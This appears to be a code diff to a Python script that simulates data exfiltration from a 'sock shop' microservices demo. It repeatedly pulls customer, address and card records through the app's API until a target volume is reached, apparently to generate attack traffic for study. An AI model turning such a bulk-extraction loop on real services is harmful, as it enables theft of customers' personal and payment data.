@@ -10,6 +10,11 @@ import parameters
 USAGE: python exfil_data_v2.py [addr of sock shop]
 note: 
 '''
+## so it looks like the next step is to have this function be able to run
+## different sized exfiltrations at different times (prob given a dictionary)
+## easy enough but need to make sure that it is passed the time when it is called
+## in the main script
+
 # amt is the amt to exfiltrate within one 5 sec period.
 def exfiltrate_data():
     cur_time = time.time()
@@ -17,19 +22,15 @@ def exfiltrate_data():
     data_exfiltrated = []
     
     # use the big calls to do as much of the exfil as possible
-    # note: these values are approximate
-    AMT_IN_CUSTOMERS = 431000
-    AMT_IN_ADDRESSES = 306000
-    AMT_IN_CARDS = 238000
-    while (amt - amt_exfil)  / AMT_IN_CUSTOMERS >= 1:
+    while (amt - amt_exfil)  / amt_customers >= 1:
         exfil_data = requests.get(addr + "/customers/")
         amt_exfil  = amt_exfil + len(exfil_data.content)
 
-    while (amt - amt_exfil)  / AMT_IN_ADDRESSES >= 1:
+    while (amt - amt_exfil)  / amt_addresses >= 1:
         exfil_data = requests.get(addr + "/addresses/")
         amt_exfil  = amt_exfil + len(exfil_data.content)
 
-    while (amt - amt_exfil)  / AMT_IN_CARDS >= 1:
+    while (amt - amt_exfil)  / amt_cards >= 1:
         exfil_data = requests.get(addr + "/cards/")
         amt_exfil  = amt_exfil + len(exfil_data.content)
 
@@ -48,15 +49,34 @@ def exfiltrate_data():
         exfil_data_2 = exfil_data_fut_2.result()
         exfil_data_3 = exfil_data_fut_3.result()
         exfil_data_4 = exfil_data_fut_4.result()
-        print exfil_data.text
+        #print exfil_data.text
         amt_exfil = amt_exfil + len(exfil_data.content) + len(exfil_data_1.content) + len(exfil_data_2.content)
         amt_exfil = amt_exfil + len(exfil_data_3.content) + len(exfil_data_4.content)
-        print len(exfil_data.content), amt_exfil
+        #print len(exfil_data.content), amt_exfil
     print "that took: ", time.time() - cur_time, " seconds" 
+
+# how much data is extracted via each call API call?
+def how_much_data(minikube_addr):
+    customers = requests.get(minikube_addr + "/customers/")
+    addresses = requests.get(minikube_addr + "/addresses/")
+    cards = requests.get(minikube_addr + "/cards/")
+
+    return len(customers.content), len(addresses.content), len(cards.content)
 
 if __name__=="__main__":
     if len(sys.argv) < 1:
         print "triggered"
     addr= sys.argv[1]
     amt = parameters.amt_to_exfil
+
+    # so the appriorate sizes of the various api calls should be passed in, but if not we can use estimates
+    amt_customers = 734589
+    amt_addresses = 174940
+    amt_cards = 48446
+    #amt_customer = # this isn't actually needed
+    if len(sys.argv) >= 4:
+        amt_customers = int(sys.argv[2])
+        amt_addresses = int(sys.argv[3])
+        amt_cards = int(sys.argv[4])
+    #    amt_customer = sys.argv[5] 
     exfiltrate_data()
